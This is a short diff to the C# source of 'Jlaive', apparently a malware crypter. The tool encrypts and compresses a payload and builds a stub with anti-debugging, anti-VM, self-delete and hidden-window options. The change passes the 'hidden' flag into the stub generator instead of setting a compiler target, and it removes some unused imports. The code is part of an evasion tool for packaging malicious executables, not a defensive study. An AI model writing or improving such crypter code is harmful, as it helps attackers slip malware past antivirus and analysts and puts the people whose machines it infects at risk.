@@ -4,18 +4,12 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
-using System.Runtime.InteropServices;
+using System.Linq;
 using System.Security.Cryptography;
-using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Microsoft.CSharp;
-
-using WshShell = IWshRuntimeLibrary.WshShell;
-using IWshShortcut = IWshRuntimeLibrary.IWshShortcut;
 
 using static Jlaive.Utils;
-using System.Linq;
 
 namespace Jlaive
 {
@@ -130,7 +124,7 @@ namespace Jlaive
             byte[] payload_enc = Encrypt(mode, Compress(pbytes), _key, _iv);
 
             log.Items.Add("Creating secondary stub...");
-            string stub = StubGen.CreateCS(_key, _iv, mode, antiDebug.Checked, antiVM.Checked, selfDelete.Checked, !isnetasm, rng);
+            string stub = StubGen.CreateCS(_key, _iv, mode, antiDebug.Checked, antiVM.Checked, selfDelete.Checked, hidden.Checked, !isnetasm, rng);
 
             log.Items.Add("Building secondary stub...");
 
@@ -172,7 +166,7 @@ namespace Jlaive
 
             log.Items.Add("Building stub...");
 
-            returnval = CompileCS(stub, new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, new string[0], "-optimize" + (hidden.Checked ? " -target:winexe" : string.Empty));
+            returnval = CompileCS(stub, new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, new string[0], "-optimize");
             results = returnval.Item1;
             if (results.Errors.Count > 0)
             {
